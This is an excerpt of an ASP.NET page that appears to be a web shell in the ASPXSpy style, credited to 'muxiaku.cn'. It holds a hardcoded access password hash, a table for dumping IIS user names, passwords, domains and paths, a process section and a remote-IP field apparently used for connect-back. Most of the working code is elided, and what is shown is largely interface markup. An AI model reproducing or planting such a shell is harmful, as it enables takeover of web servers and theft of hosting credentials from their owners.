...
*/
public string Password="c1352f43612370a763ebb389d7d32f13";
...
<tr class="head">
<td ><span style="float:right;"><a href="http://www.muxiaku.cn" target="_blank">习惯一个人 QQ:51284343</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<asp:TableRow CssClass="head"><asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS</asp:TableCell><asp:TableCell>域名</asp:TableCell><asp:TableCell>路径</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--Process--%>
...
<td style="width:20%" align="left">远程IP : <input class="input" runat="server" id="llH" type="text" size="20" value="www.muxiaku.cn"/></td>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright &copy; 2006-2009 <a href="http://www.muxiaku.cn" target="_blank">习惯一个人</a> All Rights Reserved.</div></div>
</form>
</body>
</html>
